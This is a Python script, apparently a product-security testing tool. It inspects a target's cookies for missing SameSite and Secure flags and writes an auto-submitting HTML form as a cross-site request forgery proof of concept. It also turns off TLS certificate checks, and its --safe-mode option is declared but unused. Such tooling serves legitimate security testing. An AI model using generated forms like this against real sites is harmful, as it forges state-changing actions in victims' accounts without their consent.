#!/usr/bin/env python3
"""
Generate and optionally validate a CSRF proof-of-concept form.

The script inspects cookies and emits an HTML form that can be served locally
against a test account. A positive result is a state-changing endpoint that
accepts the generated cross-site request without a valid anti-CSRF token.
"""
import argparse
import html
import json
import ssl
import sys
from pathlib import Path
from urllib.parse import parse_qsl, urlsplit
from urllib.request import Request, urlopen
from urllib.error import HTTPError, URLError

GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
RESET = "\033[0m"


def fetch(url, timeout):
    req = Request(url, headers={"User-Agent": "prod-sec-csrf-poc/1.0"})
    try:
        with urlopen(req, timeout=timeout, context=ssl._create_unverified_context()) as resp:
            return resp.status, dict(resp.headers), None
    except HTTPError as exc:
        return exc.code, dict(exc.headers), None
    except (URLError, TimeoutError, ssl.SSLError) as exc:
        return 0, {}, str(exc)


def build_form(url, method, fields):
    inputs = []
    for key, value in fields.items():
        inputs.append(f'    <input type="hidden" name="{html.escape(key)}" value="{html.escape(value)}">')
    return f"""<!doctype html>
<html>
<body>
  <form id="prodsec-csrf" action="{html.escape(url)}" method="{html.escape(method.lower())}">
{chr(10).join(inputs)}
  </form>
  <script>document.getElementById('prodsec-csrf').submit();</script>
</body>
</html>
"""


def main():
    parser = argparse.ArgumentParser(description="Generate a CSRF PoC form for a state-changing endpoint.")
    parser.add_argument("target_url")
    parser.add_argument("--method", default="POST", choices=["POST", "GET"])
    parser.add_argument("--field", action="append", default=[], help="Form field as name=value; repeatable.")
    parser.add_argument("--out", default="csrf_poc.html")
    parser.add_argument("--safe-mode", action="store_true", help="Generate PoC only; do not submit.")
    parser.add_argument("--timeout", type=float, default=8)
    args = parser.parse_args()

    fields = {"prodsec_canary": "csrf-test"}
    for item in args.field:
        if "=" in item:
            key, value = item.split("=", 1)
            fields[key] = value
    if args.method == "GET":
        for key, value in parse_qsl(urlsplit(args.target_url).query):
            fields.setdefault(key, value)

    status, headers, error = fetch(args.target_url, args.timeout)
    if error:
        print(f"{RED}[ERROR]{RESET} initial fetch failed: {error}")
    else:
        print(f"{GREEN}[INFO]{RESET} target status={status}")

    set_cookie = " ".join(v for k, v in headers.items() if k.lower() == "set-cookie")
    cookie_issues = []
    if set_cookie and "samesite" not in set_cookie.lower():
        cookie_issues.append("Cookies missing SameSite")
    if set_cookie and "secure" not in set_cookie.lower() and args.target_url.startswith("https://"):
        cookie_issues.append("HTTPS cookies missing Secure")
    for issue in cookie_issues:
        print(f"{YELLOW}[SIGNAL]{RESET} {issue}")

    poc = build_form(args.target_url, args.method, fields)
    Path(args.out).write_text(poc, encoding="utf-8")
    print(f"{GREEN}[OK]{RESET} wrote {args.out}")

    findings = []
    if cookie_issues:
        findings.append({"title": "Potential CSRF exposure indicators", "severity": "Medium", "evidence": "; ".join(cookie_issues), "poc": args.out})
    print("JSON_SNIPPET:", json.dumps({"tool": "csrf_poc_gen", "target": args.target_url, "poc_file": args.out, "findings": findings}, indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main())
